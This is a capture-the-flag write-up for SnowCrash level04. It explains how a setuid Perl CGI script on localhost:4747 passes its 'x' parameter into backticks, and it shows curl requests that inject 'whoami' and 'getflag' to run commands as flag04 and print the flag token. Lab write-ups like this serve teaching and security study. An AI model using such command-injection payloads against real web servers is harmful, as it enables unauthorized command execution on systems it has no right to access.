# level04

## Hint

By logging into the VM, we notice a perl script in our home directory.

```shell-session
level04@SnowCrash:~$ ls -la level04.pl
-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
```

Just as in the previous level, the `setuid` bit is set on that file, meaning it's execution is constrained by the rights of its owner, who just so happens to be the user whom identity we are trying to usurp in order to access his flag.

## The script

Is as follows:

```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

What we can conclude from this file:
- it uses a [Common Gateway Interface](https://fr.wikipedia.org/wiki/Common_Gateway_Interface) to chat with a web server.
- `# localhost:4747` gives the location and port of the server, meaning `127.0.0.1:4747`.
- the subroutine `x` very clearly calls the `echo` command upon its first argument conveniently named `x` and redirects all output (namely stderr) to stdout.
- the call to `echo` is wrapped in between backticks, which suggests that the output is captured in order to print it through the Gateway.

So, if we send a mere string to that script, that string will be printed, and if we wrap a command between backticks and send it to the script, then that command's output will be printed.

## whoami

To test it we can run the following but notice something odd:

```shell-session
level04@SnowCrash:~$ ./level04.pl x=`whoami`
Content-type: text/html

level04
```

the `whoami` command displays **OUR** uid, instead of the supposed `flag04` file owner's one.

This is quite a troubling situation but a quick Google search `setuid on my perl script not working` leads us to [this](https://unix.stackexchange.com/questions/190740/why-is-the-suid-bit-having-no-effect-on-a-shell-or-perl-script) discussion which gives us a hint at *why* we are stuck in this situation:

> suid bit is disabled for scripts in most linux and unix distributions because it opens several security holes.

## server

Since this script is ran on the server mentionned previously, it would only make sense to test if the output is the same there:

```shell-session
level04@SnowCrash:~$ curl '127.0.0.1:4747/level04.pl?x=`whoami`'
flag04
```

Which is not the case and in order to understand why, we must inspect the configurations file of the server, and as for most config files, we find it under the `/etc` directory.

Namely: `/etc/apache2/sites-enabled/level05.conf`.

```shell-session
level04@SnowCrash:/etc/apache2/sites-enabled$ cat level05.conf
<VirtualHost *:4747>
	DocumentRoot	/var/www/level04/
	SuexecUserGroup flag04 level04 # <---- important information
	<Directory /var/www/level04>
		Options +ExecCGI`
		DirectoryIndex level04.pl
		AllowOverride None
		Order allow,deny
		Allow from all
		AddHandler cgi-script .pl
	</Directory>
</VirtualHost>
```

And as the [apache conf manual](https://httpd.apache.org/docs/2.4/fr/mod/mod_suexec.html) states:
> The SuexecUserGroup directive allows you to specify a user and group for CGI programs to run as. Non-CGI requests are still processed with the user specified in the User directive.

So this setting, if enabled, allows for the execution of code with rights inherited from the designated *user* - *group* identity in the conf file.

# getflag

```shell-session
level04@SnowCrash:~$ curl '127.0.0.1:4747/level04.pl?x=`getflag`'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```
